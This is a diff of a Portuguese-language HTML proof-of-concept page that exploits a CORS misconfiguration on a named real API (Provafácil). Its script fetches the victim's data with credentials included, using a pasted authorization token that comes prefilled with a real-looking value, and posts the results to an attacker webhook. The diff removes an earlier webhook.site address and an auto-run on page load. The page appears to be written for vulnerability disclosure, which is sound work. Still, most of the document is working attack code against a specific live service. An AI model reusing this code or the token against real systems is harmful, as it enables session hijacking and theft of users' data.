@@ -10,22 +10,32 @@
         .badge-critical { background: #dc3545; }
         h2 { color: #333; }
         code { background: #eee; padding: 2px 5px; border-radius: 3px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; }
     </style>
 </head>
 <body>
 
-    <h1>🔬 POC: Cross-Origin Data Exfiltration</h1>
-    <p>Esta página demonstra como um atacante pode exfiltrar dados sensíveis de um usuário autenticado na API da Provafácil usando uma misconfiguração de CORS.</p>
+    <h1>🔬 POC: Cross-Origin Data Exfiltration via CORS</h1>
+    <p>Esta página demonstra como um atacante pode exfiltrar dados sensíveis de um usuário autenticado na API da Provafácil, mesmo que o script esteja rodando em um domínio de terceiros.</p>
     
-    <div class="badge badge-critical">STATUS: EXECUTANDO ATAQUE</div>
-    <p><strong>Como funciona:</strong> O script abaixo faz uma requisição <code>fetch</code> para a API da Provafácil com <code>credentials: 'include'</code>. Como o servidor reflete a origem (<code>evil.com</code>) e permite credenciais, o navegador inclui o <code>Authorization Token</code> e os <code>Cookies</code> da sessão ativa do usuário.</p>
+    <div class="badge badge-critical">STATUS: PRONTO PARA ATAQUE</div>
+    <p><strong>Cenário:</strong> O atacante já obteve o <code>Authorization Token</code> da vítima (ex: via XSS, log de rede, ou interceptação). Agora, ele usa a misconfiguração de CORS para exfiltrar dados de qualquer origem.</p>
+    <p><strong>Como funciona:</strong> O script envia uma request <code>fetch</code> para a API da Provafácil com o header <code>Authorization</code> e <code>credentials: 'include'</code>. Como o servidor reflete a origem (<code>evil.com</code>) e permite o header <code>authorization</code> (via preflight), o navegador permite a leitura da resposta.</p>
 
-    <h2>Console de Exfiltração</h2>
-    <div id="console" class="console">Iniciando exfiltração de dados...\n</div>
+    <h2>1. Insira o Token da Vítima</h2>
+    <p>Cole o <code>Authorization Token</code> da vítima (formato: <code>Token [hex_string]</code>). Você pode obtê-lo no DevTools da vítima (aba Network > Headers > Authorization).</p>
+    <input type="text" id="victimToken" placeholder="Token 4953cd2bb8d7d4c6f3ed7d63061b189c8d9974e0" value="Token 4953cd2bb8d7d4c6f3ed7d63061b189c8d9974e0">
+
+    <h2>2. Console de Exfiltração</h2>
+    <div id="console" class="console">Aguardando execução...\n</div>
+
+    <button onclick="executeAttack()" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 10px;">
+        🚀 Executar Exfiltração
+    </button>
 
     <script>
         const API_URL = 'https://uj-uva.provafacilnaweb.com.br/uj-uva/api/v2/ot/get-menu/';
-        const ATTACKER_LOG_URL = ' https://webhook.site/a4aa265f-a678-4d16-9e05-7d894636caed'; // Substitua por um endpoint webhook.site ou paste.io
+        const ATTACKER_LOG_URL = 'https://SEU-WEBHOOK-URL-AQUI'; // Substitua
         const consoleEl = document.getElementById('console');
 
         function log(msg) {
@@ -34,27 +44,32 @@
         }
 
         async function executeAttack() {
+            const token = document.getElementById('victimToken').value.trim();
+            if (!token) {
+                log("❌ Erro: Insira um token válido.");
+                return;
+            }
+
+            log(`Iniciando exfiltração com token: ${token.substring(0, 20)}...`);
             log(`Enviando request para: ${API_URL}`);
-            log(`Headers incluídos: credentials: 'include'`);
-            
+            log(`Headers: Authorization: ${token}, credentials: 'include'`);
+
             try {
-                // O 'credentials: include' é a chave. O navegador inclui os cookies/tokens do domínio alvo.
                 const response = await fetch(API_URL, {
                     method: 'GET',
                     credentials: 'include',
                     headers: {
                         'Accept': 'application/json, text/plain, */*',
-                        'Origin': 'https://evil.com' // O navegador preenche isso automaticamente, mas podemos forçar para clareza
+                        'Authorization': token
                     }
                 });
 
                 if (!response.ok) {
                     log(`Erro HTTP: ${response.status} ${response.statusText}`);
+                    log("Verifique se o token é válido e não expirou.");
                     return;
                 }
 
-                // Se o CORS estivesse correto (sem refletir evil.com), o navegador bloquearia o .json() aqui.
-                // Como o bug existe, o .json() funciona.
                 const data = await response.json();
 
                 log("✅ DADOS EXFILTRADOS COM SUCESSO!");
@@ -68,8 +83,6 @@
                 log(`Menus Habilitados:    ${JSON.stringify(data.menus)}`);
                 log("----------------------------------------");
 
-                // 2. Enviar para o servidor do atacante (Exfiltração Real)
-                log("Enviando payload para o servidor do atacante (webhook)...");
                 const exfiltrationPayload = {
                     source: "CORS_POC",
                     victim_origin: window.location.origin,
@@ -87,12 +100,9 @@
 
             } catch (error) {
                 log(`❌ FALHA NO ATAQUE: ${error.message}`);
-                log("Verifique se o usuário está logado na Provafácil ou se o CORS está configurado corretamente.");
+                log("Verifique o console do navegador (F12) para detalhes.");
             }
         }
-
-        // Iniciar ao carregar a página
-        window.onload = executeAttack;
     </script>
 
 </body>
